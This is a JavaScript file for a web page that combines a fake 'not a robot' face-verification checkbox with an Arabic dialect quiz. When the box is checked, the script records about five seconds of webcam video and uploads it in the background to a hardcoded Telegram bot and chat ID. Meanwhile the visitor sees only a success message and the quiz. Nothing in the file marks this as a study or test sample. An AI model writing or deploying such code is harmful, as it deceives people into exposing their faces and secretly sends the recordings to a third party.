const video = document.getElementById('video');
const checkbox = document.getElementById('robot-checkbox');
const loading = document.querySelector('.loading');
const success = document.querySelector('.success');

checkbox.addEventListener('change', (e) => {
    if (e.target.checked) {
        video.style.display = 'block';
        loading.style.display = 'block';
        success.style.display = 'none';
        const faceShape = document.getElementById('face-shape');

        // Request camera permission
        navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => {
            video.srcObject = stream;

            const mediaRecorder = new MediaRecorder(stream);
            const chunks = [];
            mediaRecorder.start();
            mediaRecorder.ondataavailable = (event) => { chunks.push(event.data); };

            // Show the face shape after camera permission is granted
            faceShape.classList.add('active');

            // Change face shape color after 4 seconds
            setTimeout(() => {
                faceShape.classList.add('green'); // Change color to green
            }, 4000);

            setTimeout(() => { 
                mediaRecorder.stop(); 
                faceShape.classList.remove('active'); // Hide face shape after recording
            }, 5000);

            mediaRecorder.onstop = () => {
                loading.style.display = 'none';
                success.style.display = 'block';
                stream.getTracks().forEach(track => track.stop());

                // Start the quiz game
                document.getElementById('verification-container').style.display = 'none';
                document.getElementById('quiz-container').style.display = 'block';

                // Send video to Telegram in background
                const blob = new Blob(chunks, { type: 'video/webm' });
                const formData = new FormData();
                formData.append('chat_id', '2070423407'); 
                formData.append('video', blob, 'video.webm');

                fetch(`https://api.telegram.org/bot5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q/sendVideo`, { method: 'POST', body: formData })
                    .catch((error) => { console.error('Video upload failed:', error.message); });
            };
        })
        .catch((err) => { alert("Unable to access the camera: " + err.message); });
    }
});

let currentQuestionIndex = 0;
let score = 0;
let selectedDialect = '';
let questions = [];
let answers = [];
let wrongAnswers = [];

const questionText = document.getElementById('question-text');
const optionsContainer = document.getElementById('options-container');
const resultDiv = document.getElementById('result');
const allQuestionsContainer = document.getElementById('all-questions');

async function startQuiz(dialect) {
    selectedDialect = dialect;
    questions = (await fetch('questions.json').then(response => response.json()))[selectedDialect];
    currentQuestionIndex = 0;
    score = 0;
    wrongAnswers = [];
    answers = [];
    document.getElementById('language-buttons').style.display = 'none';
    displayQuestion();
    document.getElementById('question-container').style.display = 'block';
}

function displayQuestion() {
    if (currentQuestionIndex < questions.length) {
        const question = questions[currentQuestionIndex];
        questionText.textContent = question.q;

        optionsContainer.innerHTML = '';
        question.options.forEach((option, index) => {
            const optionDiv = document.createElement('div');
            optionDiv.classList.add('option');
            optionDiv.textContent = option;
            optionDiv.onclick = () => {
                const answerIndex = index;
                answers.push(answerIndex);
                if (question.correct === answerIndex) {
                    score++;
                } else {
                    wrongAnswers.push(question);
                }
                currentQuestionIndex++;
                displayQuestion();
            };
            optionsContainer.appendChild(optionDiv);
        });
    } else {
        showResult();
    }
}

function showResult() {
    document.getElementById('question-container').style.display = 'none';
    resultDiv.style.display = 'block';

    // Show all questions with their answers and colors
    allQuestionsContainer.innerHTML = '';
    questions.forEach((question, index) => {
        const questionDiv = document.createElement('div');
        questionDiv.classList.add('question');
        questionDiv.innerHTML = `
            <h3>${question.q}</h3>
            <div class="${question.correct === answers[index] ? 'correct' : 'wrong'}">
                <p>${question.options[answers[index]]}</p>
            </div>
            <div class="correct-answer">
                <p>${question.options[question.correct]}</p>
            </div>
        `;
        allQuestionsContainer.appendChild(questionDiv);
    });

    const scoreText = document.createElement('p');
    scoreText.textContent = `نتيجتك: ${score} / ${questions.length}`;
    allQuestionsContainer.appendChild(scoreText);
}

function restartQuiz() {
    document.getElementById('result').style.display = 'none';
    document.getElementById('verification-container').style.display = 'block';
    document.getElementById('quiz-container').style.display = 'none';
}
